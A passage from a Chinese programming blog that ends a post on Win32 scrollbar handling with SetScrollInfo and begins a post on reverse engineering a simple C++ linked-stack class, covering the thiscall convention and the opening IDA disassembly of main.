<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line">	si.fMask = SIF_RANGE | SIF_PAGE;</span><br><span class="line">	si.nMin = <span class="number">0</span>;</span><br><span class="line">	si.nMax = NUMLINES - <span class="number">1</span>;</span><br><span class="line">	si.nPage = cyClient / cyChar;</span><br><span class="line">	SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);</span><br><span class="line">	<span class="comment">//iVscrollMax = max(0, NUMLINES - cyClient / cyChar);老方法</span></span><br><span class="line">	<span class="comment">//SetScrollRange(hwnd, SB_VERT, 0, iVscrollMax, TRUE);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>虽然我们传递的<code>si.nMax=NUMLINES-1</code>但是Windows操作系统会自动将滚动条范围最大值设置为<code>si.nMax-si.nPage+1</code>,这就是SetScrollInfo函数相对于SetScrollRange的好处</p>
<h3 id="更完善的滑动效果">更完善的滑动效果</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar, cxClient, cyClient, iMaxWidth;<span class="comment">//字母宽度,大写字母宽度,行高度,客户区宽度,客户区高度,期望的最长宽度 //单位全是像素</span></span><br><span class="line">	HDC hdc;</span><br><span class="line">	<span class="type">int</span> i, x, y, iVertPos, iHorzPos, iPaintBeg, iPaintEnd;<span class="comment">//循环变量,绘制起点x,绘制起点y,竖直滑块位置,水平滑块位置,需要开始绘制的行号,需要结束绘制的行号</span></span><br><span class="line">	PAINTSTRUCT ps;</span><br><span class="line">	SCROLLINFO si;</span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">	TEXTMETRIC tm;</span><br><span class="line">	RECT rect;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (message) &#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line"></span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);<span class="comment">//获取系统字体属性</span></span><br><span class="line">		cxChar = tm.tmAveCharWidth;</span><br><span class="line">		cxCaps = cxChar;</span><br><span class="line">		<span class="keyword">if</span> (tm.tmPitchAndFamily &amp; <span class="number">1</span>) &#123;</span><br><span class="line">			cxCaps = cxChar * <span class="number">3</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line"></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		iMaxWidth = <span class="number">40</span> * cxChar + <span class="number">22</span> * cxCaps;<span class="comment">//初始化期望的最长宽度,以后就当作常数使用了</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_SIZE:</span><br><span class="line">		cxClient = LOWORD(lParam);<span class="comment">//获取实时客户区宽度</span></span><br><span class="line">		cyClient = HIWORD(lParam);<span class="comment">//获取实时客户区高度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//设置竖直滚动条属性</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);<span class="comment">//初始化si结构体</span></span><br><span class="line">		si.fMask = SIF_RANGE | SIF_PAGE;<span class="comment">//设置访问掩码</span></span><br><span class="line">		si.nMin = <span class="number">0</span>;<span class="comment">//设置滚动条范围上限为0</span></span><br><span class="line">		si.nMax = NUMLINES - <span class="number">1</span>;<span class="comment">//设置滚动条下限为NUMLINES-1</span></span><br><span class="line">		si.nPage = cyClient / cyChar;<span class="comment">//设置滚动条滚一页(一页=客户区一屏)的行数,客户区高度/一行的高度=客户区行数</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);<span class="comment">//注册滚动条信息</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//设置水平滚动条属性</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);<span class="comment">//初始化si结构体</span></span><br><span class="line">		si.fMask = SIF_RANGE | SIF_PAGE;<span class="comment">//设置访问掩码</span></span><br><span class="line">		si.nMin = <span class="number">0</span>;</span><br><span class="line">		si.nMax = <span class="number">2</span> + iMaxWidth / cxChar;<span class="comment">//水平一页的宽度</span></span><br><span class="line">		si.nPage = cxClient / cxChar;<span class="comment">//客户区宽度➗字符宽度=一行可以有多少个字符</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_HORZ, &amp;si, TRUE);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_VSCROLL:</span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_ALL;<span class="comment">//设置访问掩码</span></span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line">		iVertPos = si.nPos;<span class="comment">//iVertPos记录修改之前的si.nPos滑块位置</span></span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_TOP:</span><br><span class="line">			si.nPos = si.nMax;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_BOTTOM:</span><br><span class="line">			si.nPos = si.nMin;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEUP:</span><br><span class="line">			si.nPos -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEDOWN:</span><br><span class="line">			si.nPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEUP:</span><br><span class="line">			si.nPos -= si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEDOWN:</span><br><span class="line">			si.nPos += si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBTRACK:<span class="comment">//TRACK会一直跟踪鼠标位置</span></span><br><span class="line">			si.nPos = si.nTrackPos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		si.fMask = SIF_POS;<span class="comment">//设置访问掩码,修改滚动条的滑块位置信息</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);</span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (si.nPos != iVertPos) &#123;<span class="comment">//比较本次修改前后si.nPos是否发生了变化</span></span><br><span class="line">			<span class="comment">//如果发生了变化则立刻通知重绘</span></span><br><span class="line">			ScrollWindow(hwnd, <span class="number">0</span>, cyChar * (iVertPos - si.nPos), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_HSCROLL:</span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_ALL;</span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		iHorzPos = si.nPos;</span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_LINERIGHT:</span><br><span class="line">			si.nPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINELEFT:</span><br><span class="line">			si.nPos -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGELEFT:</span><br><span class="line">			si.nPos -= si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGERIGHT:</span><br><span class="line">			si.nPos += si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBPOSITION:<span class="comment">//POSITION只会在鼠标松开时才更新位置</span></span><br><span class="line">			si.nPos = si.nTrackPos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		si.fMask = SIF_POS;</span><br><span class="line">		SetScrollInfo(hwnd, SB_HORZ, &amp;si, TRUE);</span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		<span class="keyword">if</span> (si.nPos != iHorzPos) &#123;</span><br><span class="line">			ScrollWindow(hwnd, cxChar * (iHorzPos - si.nPos), <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd,&amp;ps);<span class="comment">//ps包含了当前客户区信息</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_POS;</span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line">		iVertPos = si.nPos;<span class="comment">//获取当前滑块位置</span></span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		iHorzPos = si.nPos;</span><br><span class="line">		iPaintBeg = max(<span class="number">0</span>, iVertPos + ps.rcPaint.top / cyChar);<span class="comment">//计算绘制第几行</span></span><br><span class="line">		iPaintEnd = min(NUMLINES - <span class="number">1</span>, iVertPos + ps.rcPaint.bottom / cyChar);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span> (i = iPaintBeg; i &lt;= iPaintEnd; ++i) &#123;</span><br><span class="line">			</span><br><span class="line">			x = cxChar * (<span class="number">1</span> - iHorzPos);</span><br><span class="line">			y = cyChar * (i - iVertPos);</span><br><span class="line">			TextOut(hdc, x, y, sysmetrics[i].szLabel, lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, x+<span class="number">22</span>*cxCaps, y, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			SetTextAlign(hdc, TA_RIGHT | TA_TOP);</span><br><span class="line">			wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">			TextOut(hdc, x + <span class="number">22</span> * cxCaps+<span class="number">40</span>*cxChar, y, szBuffer,lstrlen(szBuffer));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT | TA_TOP);</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		EndPaint(hwnd, &amp;ps);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用老式函数时拖动滑块只有当鼠标松开,才会重绘客户区</p>
<p>现在只要是鼠标拖着竖直滑块有动作,客户区实时更新</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808144125813.png"
alt="image-20220808144125813" />
<figcaption aria-hidden="true">image-20220808144125813</figcaption>
</figure>
<p>绷不住了</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/27/C++%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/27/C++%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">C++ reverse</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-27 21:43:00" itemprop="dateCreated datePublished" datetime="2022-07-27T21:43:00+08:00">2022-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-11 21:44:54" itemprop="dateModified" datetime="2022-09-11T21:44:54+08:00">2022-09-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c-reverse">C++ reverse</h1>
<h2 id="windows-x86-g编译器生成的代码">windows x86
g++编译器生成的代码</h2>
<p>以链栈类为例观察C++的反汇编长啥样</p>
<h3 id="链栈类图">链栈类图</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727214639205.png"
alt="image-20220727214639205" />
<figcaption aria-hidden="true">image-20220727214639205</figcaption>
</figure>
<p>mermaid在typora上可以正常显式,但是放到网页上就不知道发生什么事了</p>
<h3 id="代码实现">代码实现</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Stack</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">length</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> len == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedNode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    LinkedNode *next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">int</span> v = <span class="number">0</span>, LinkedNode *n = <span class="literal">NULL</span>) : <span class="built_in">value</span>(v), <span class="built_in">next</span>(n) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span> v = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        value = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setNext</span><span class="params">(LinkedNode *n = <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        next = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">LinkedNode *<span class="title">getNext</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="type">const</span> LinkedNode &amp;node)</span><br><span class="line">    &#123;</span><br><span class="line">        os &lt;&lt; node.value;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedStack</span> : <span class="keyword">public</span> Stack</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    LinkedNode *head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedStack</span>() : <span class="built_in">Stack</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        LinkedNode *node = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(x, head-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(node);<span class="comment">//头插</span></span><br><span class="line">        ++len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        LinkedNode *p = head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(p-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        --len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;<span class="built_in">getNext</span>()-&gt;<span class="built_in">getValue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedStack sta;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sta.<span class="built_in">push</span>(i);<span class="comment">//测试压栈功能</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; sta.<span class="built_in">length</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">while</span> (!sta.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; sta.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;<span class="comment">//测试取栈顶功能</span></span><br><span class="line">        sta.<span class="built_in">pop</span>();<span class="comment">//测试退栈功能</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="gcc编译链接">GCC编译链接</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp -O0 -o main -m32</span><br></pre></td></tr></table></figure>
<h3 id="thiscall调用约定">thiscall调用约定</h3>
<p><strong>thiscall调用约定</strong></p>
<p><strong>唯一一个不能明确指明的函数修饰，因为thiscall不是关键字。他是C++类成员函数缺省的调用约定。由于成员函数调用还是一个this指针，所以thiscall是专为C++设计的调用方式。</strong></p>
<p><strong>1、参数从右往左入栈</strong></p>
<p><strong>2、如果参数个数确定，this指针通过通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</strong></p>
<p><strong>3、对参数个数不定的，调用者清理堆栈，否则函数自己清理</strong></p>
<h3 id="main函数反汇编">main函数反汇编</h3>
<h4 id="main函数开端">main函数开端</h4>
<p>main遵守cdecl调用约定,只有成员函数才遵守thiscall调用约定</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220428152115878.png"
alt="image-20220428152115878" />
<figcaption aria-hidden="true">image-20220428152115878</figcaption>
</figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401530 ; Attributes: bp-based frame fuzzy-sp</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401530                 public _main</span><br><span class="line">.text:00401530 _main           proc near               ; CODE XREF: ___tmainCRTStartup+221↑p</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530 var_14          = dword ptr -14h</span><br><span class="line">.text:00401530 var_10          = byte ptr -10h</span><br><span class="line">.text:00401530 var_4           = dword ptr -4</span><br><span class="line">.text:00401530 argc            = dword ptr  8</span><br><span class="line">.text:00401530 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401530 